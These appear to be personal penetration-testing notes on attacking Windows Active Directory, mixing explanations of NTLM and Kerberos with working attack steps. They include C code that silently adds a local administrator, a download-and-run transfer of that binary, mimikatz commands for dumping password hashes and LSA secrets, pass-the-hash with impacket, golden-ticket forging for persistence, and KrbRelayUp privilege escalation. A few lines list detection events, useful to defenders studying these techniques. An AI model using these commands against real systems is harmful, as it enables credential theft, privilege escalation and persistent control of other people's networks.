In windows you can always check with -WhatIf  COMMAN in powershell like "Restart-Computer -WhatIf"
Domain Controller (DC), The DC (which in Kerberos terms is a Key Distribution Center, or KDC) 
------
$ ([ADSI]("LDAP://CN=John Doe,OU=Users,DC=domain,DC=com")).Properties.PropertyNames  #gives list all property names 
To find propper CN ....
$ ([ADSISearcher]"(sAMAccountName=JohnDoe)").FindOne().Properties.distinguishedname
To find sAMAccountName
$ $env:USERNAME #powershell
$ echo %USERNAME%  #cmd


in CMD
$ hostname
$ whoami    #if domain before \username is different that hostname, its AD account.
$ net user  #Shows local users on pc
$ whoami /groups  #overview of domain and local groups this user is.   IBM\Marketing   Group     S-1-5-21-4002288239-111288127-1231543-9402
                                                                     domain\groupname                Security ID                      -9402 is Identifier
$ Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}   #See all running services Powershell command.
#Check for LocalSystem, cos of highest priviledges and stay away from System32, look for anomalies - path thats somewhere else.

Enumerate binaries that you found with ICACLS - Integrity Access Control Access Lists. It used to enumerate access control list on binary or folder.
$ icacls "C:\Program Files (x86)\Common Files\Zoom\Support\Service.exe"
We look for some binary where   BUILTIN\Users:(I)(RX) is (F)  F - means full access  (I) - means its Inheriting access from parents folder rights
Also check services start mode!
$ Get-CimInstance -ClassName Win32_Service -Filter "Name= 'mysql'" | Select-Object StartMode         #specific service
$ Get-CimInstance -ClassName Win32_Service | Select-Object Name, StartMode                           #all services


Create .exe on Kali that adds local admin to machine.
----------------------------------------------------------
#include <stdlib.h>
int main ()
{
  int i;
  i = system ("net user mighty password123! /add");
  i = system ("net localgroup administrators mighty /add");
  return 0;
}
----------------------------------------------------------

Run compiler command on Kali to compile this C program to exe file.
$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe    #adduser.c is our name of prog to add user and output is .exe. In Kali
Start web server and get file from Kali to Win
$ python3 -m http.server 80                                      #Kali
$ iwr -Uri http://192.168.1.47/adduser.exe -OutFile adduser.exe  #windows

$ whoami /priv     #shows the security privileges for the current logged-in user.


N  T   M    L
----------------------
NTML is not so safe than Kerberos, if AD has NTML its vulnerability, but as NTML works with older apps, so its there :)
If you get NTML hash for user, you can use that hash (pass the hash attack) instead of password and use the hash to authenticate.

Michael logs in with his acc and pw, client will calculate its NTML hash based on the password and is gonna be stored in memory of the client. Client is gonna then send username to the something, where Michael wants to connect. something gonna response with challenge - random value, client is gonna receive chanllenge and encrypt it using NTML hash, that is based on Michaels password and send it back - this is know as response. Then something where Michael wants to log is gonna receive this response and forward 1.) response and 2.) username and 3.) challenge to the Domain controller or DC, and DC looks for its NTML hash for Michael and encrypt challenge itself, then compare result with "response".


K  E  R  B  E  R  O  S
------------------------
Kerberos issue tickets and use for authentication. Client logs in with acc and pasw and sends authentication server request ASReq to KDC or key distribution center (Which in most cases runs on domain controller). This request contains timestamp, that is encrypted using hash that is derived from users password. Then Domain Controller that have access to all the password hashes, will try to decrypt timestamp with its version of user hash and if those are matching auth happens and Domain controller sends reply to client with ASRep (Authentication server reply). And THIS CONTAINS JUICY INFO we are after - session key and ticket granting ticket. session key is encrypted with users password, but tgt itself also contains interesting info about user, such as username, what groups user have access to, like if you are domain admin etc. And TGT is encrypted using secret key, which is the NTML hash for the krbtgt account! Thats superimportant account in AD!
After this client or user shows the ticket to KDC whenever need access to the resource.

Example Michael logs in Domain and then RDP to another machine. At RDP that moment Michaels computer gonna send "Ticket granting service" to the KDC requesting service ticket. KDC then is gonna verify TGT if its valid, and if its valid KDC gonna send service ticket back to Michaels pc. And then Michaels pc gonna send this ticket to something where he wants to log in, something gonna decrypt the ticket, verifies access permissions and let him log in.


If user authenticate to IP address instead of hostname then automatically NTML authentication is used.
If user authenticates with hostname that is not registred in AD integrated DNS server, then NTML is used.
3rd party apps often use NML as well.


Start to use mimikatz, but AV will cath this obfuscation course is needed. Fantastic tool for AD pentesting.

$ mimikatz # privilege::debug              #first to check if we can run process "Priviledge '20' OK"
$ mimikatz # sekurlsa::logonpasswords      #Tapping into LSA (Local security authority) process to check if NTML hashes are saved in memory.
Attacker waits when someone logs in to get their NTML hash!

On Kali:
$ /usr/bin/impacket-wmiexec -hashes :ar545hjfjans353535NTMLhashfromprevious domain/username@ip (sedocorp/bob@192.168.144.144)
Example: $ /usr/bin/impacket-wmiexec -hashes :a57b67b0bfe5dbd258226194f0caf201 corp/mary@192.168.1.41

#Also sometimes we need port 135 to be open on target! Also we need to be local administrator on the machine! 

#impacket-wmiexec alternatives - EvilWinRM, mimikatz, crackmapexec, Metasploit.

# # # #  WHEN WE IN SYSTEM # # # # # 

$cd appdata\roaming\microsoft\windows\powershell\psreadline    #ConsoleHost_history.txt
$ type ConsoleHost_history.txt

# # # # # We want persistance to come back later If we had domain admin # # # # # 
If you add new admin user that can be seen. What we are gonna do is to forge ticket a TGT. we are not going to use the KDC or Kerberos logging or anything for this. we are gonna fake this ourselves.
This TGT is gonna appeared to be signed by domains Legitimate KDC itself and we are gonna encrypt the ticket with a krbtgt password hash, which is used when login in domain with kerberous.
We need:
1.) domain SID
2.) krbtgt password hash

First download mimikatz
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch    #as domain controller this is gonna dump whole lsa. We will get every single user hash including krbtgt
                                  # /patch is going to inject a dll into the LSUS process, its gonna hook and modify certain functions and
                                  #allow mimikatz to read the hashes with out access restrictions, trigering errors

After krbtgt hash you can login with simple low priviledged user and not needed, but purge all kerberos tickets:
mimikatz # kerberos::purge    #now we have 0 tickets
mimikatz # kerberos::golden /user:michael        #For this we need legitimate user in domain, since July 2022 you need valid user in domain before u didnt.
                            /domain:corp.com  #Domain
                            /sid:S-1-5-21-4002288239-111288127-1231543-9402   #Domain SID
                            /krbtgt:7b67b0bfe5dbd258226194f0caf20             #krbtgt hash
                            /ppt #to pass the ticket in current session! or /ticket:ticket_name_random  #generate file with a ticket that we can store
                            /endin:
THAT ALL is in 1 line! divided by space of course each from other

> .\PsExec64.exe \\dc01 cmd.exe    #PsExec allows you to execute processes on remote systems and redirect the output to the local system.
#to test connection to remote system as user
#access with ticket, also you can do this on computer that is not part of domain! But you must communicate to network, so you need to pig DC
1.)   mimikatz # kerberos::ppt ticket_name_random    #ppt = pass the ticket attack
2.)   mimikatz # misc::cmd                           #start cmd
IN THAT CMD if we groups and whoami we are just normal user that we are, but there is ticket injecet in memory. when we try to ".\PsExec64.exe \\dc01 cmd.exe"

WHEN WAS LAST TIME WHEN KRBTGT PASSWORD HAS CHANGED



====================================================================================================================================================================================
====================================================================================================================================================================================
====================================================================================================================================================================================
====================================================================================================================================================================================
                          Attacking Domain Trusts
====================================================================================================================================================================================
====================================================================================================================================================================================
====================================================================================================================================================================================
====================================================================================================================================================================================
Forest trusts can only be created between two root domains of different forests, so any mention in this post of a forest trust is the trust between two different root domains.
A SID is something which uniquely identifies a security principal, such as a user, group, or domain.

Because there is a two-way trust between forest A and forest B, the DC of forest-a can issue us a referral ticket (TGT) to forest-b. This ticket is signed with the Kerberos inter-realm trust key, and contains the groups we are a member of in forest-a. Forest B will accept this ticket and grant us a Service Ticket for forest-b-server, which we can use to authenticate.
When we connect on our workstation in Forest A to the server in Forest B, we can see the tickets with the klist command command-line tool primarily used in Kerberos (a network authentication protocol) environments. It's used to view the tickets that are currently cached for a user:
$ klist

mimikatz # sekurlsa::tickets /export  #dump all the Kerberos tickets to disk 

===================================================================================
                           KERBEROS RELAYING (KrbRelayUp) Attack
===================================================================================
Requires to user create Machine Account in AD! User cant have ability to add computer in AD!!! ITs vulnerability what this (and ton more attacks) exploit.

ShorSec/KrbRelayUp: KrbRelayUp - a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings).

--------------------
powershell> ([ADSI]("LDAP://" + ([ADSI]"LDAP://RootDSE").defaultNamingContext[0])).properties['ms-DS-MachineAccountQuota'].Value  #User that runs 1st - AD user, 
                                                                                                                                   has read access to domain properties.
1.)   ([ADSI]"LDAP://RootDSE"): This portion connects to the RootDSE object in Active Directory using ADSI (Active Directory Service Interfaces). The RootDSE is a special LDAP entry that provides information about the LDAP server, including properties about the directory.

ADSI is a way in PowerShell to connect to directory services, which include Active Directory. By placing [ADSI] in front of a string, you're casting the string to an ADSI object, which is a type of .NET object that allows for interactions with directory services.

2.)   .defaultNamingContext[0]: The defaultNamingContext property of the RootDSE object gives us the distinguished name (DN) of the default domain. Since the result of this property can be an array, [0] ensures that we're taking the first (and usually only) item.

3.)   "LDAP://" + ...: We're constructing an LDAP URL. LDAP (Lightweight Directory Access Protocol) URLs are used to connect to directory services. The URL starts with LDAP:// followed by the DN of the domain, which we obtained in the previous step.

4.)    ([ADSI]("LDAP://" + ...)): Now that we have the LDAP URL of our domain, we're connecting to the domain itself. This gives us access to the domain's properties.

5.)   .properties['ms-DS-MachineAccountQuota'].Value: After connecting to the domain, we access its properties and specifically fetch the value of the ms-DS-MachineAccountQuota property. This property tells us the number of computer accounts an ordinary user can create in the domain.

To sum it up: the command fetches the distinguished name of the default domain, constructs an LDAP URL to connect to that domain, accesses the domain's properties, and then retrieves the value of the ms-DS-MachineAccountQuota property.
--------------------

$ .\KrbRelayUp relay -Domain testdomain.com -CreateNewComputerAccount - ComputerName newpc$ -ComputerPassword passwdddd$   # $ means pc and $ after password is not in pasw.

$ .\KrbRelayUp spawn -d testdomain.com -cn newpc$ -cp passwdddd$
It spawns session, that gives nt authority\system.

1.) But this technique gives very specific event in event viewer! 4624 with source network address of 127.0.0.1 (Biggest TRIGGER - why would host auth to itself on kerberos with Administrative user not user itself)! Also its Logon Type: 3 (Network logon).
2.) ALSO syslog 7045 - It also installs a service with name KrbSCM (can be changed). C:\Users\usernameofpc\Desktop\KrbRelayUp.exe
3.)

===================================================================================
                Relaying Kerberos over DNS using krbrelayx and mitm6
===================================================================================
$ Get-WmiObject Win32_ComputerSystem | Select-Object Domain   #to get propper domain name



Standard query Oxaf1b SOA ICORP-W10.internal.corp
Standard query response Oxaf1b SOA ICORP-W10.internal.corp SOA icorp-dc.internal.corp A 192.168.111.2
Dynamic update 0x40cc SOA internal.corp CNAME AAAA A A 192.168.111.73
Dynamic update response 0x40cc Refused SOA internal.corp CNAME AAAA A A 192.168.111.73
Standard query 0xad45 TKEY 1448-ms-7.3-5987ec.db7c7870-9307-11ec-3882-001a7dda7115 TKEY
Standard query response Oxad45 TKEY 1448-ms-7.3-5987ec.db7c7870-9307-11ec-3882-001a7dda7115 TKEY TSIG
Dynamic update 0x488c SOA internal.corp CNAME AAAA A A 192.168.111.73 TSIG
Dynamic update response 0x488c SOA internal.corp CNAME AAAA A A 192.168.111.73 TSIG


The client queries for the Start Of Authority (SOA) record for it’s name, which indicates which server is authoritative for the domain the client is in.
The server responds with the DNS server that is authorative, in this case the DC icorp-dc.internal.corp.
The client attempts a dynamic update on the A record with their name in the zone internal.corp.
This dynamic update is refused by the server because no authentication is provided.
The client uses a TKEY query to negotiate a secret key for authenticated queries.
The server answers with a TKEY Resource Record, which completes the authentication.
The client sends the dynamic update again, but now accompanied by a TSIG record, which is a signature using the key established in steps 5 and 6.
The server acknowledges the dynamic update. The new DNS record is now in place.















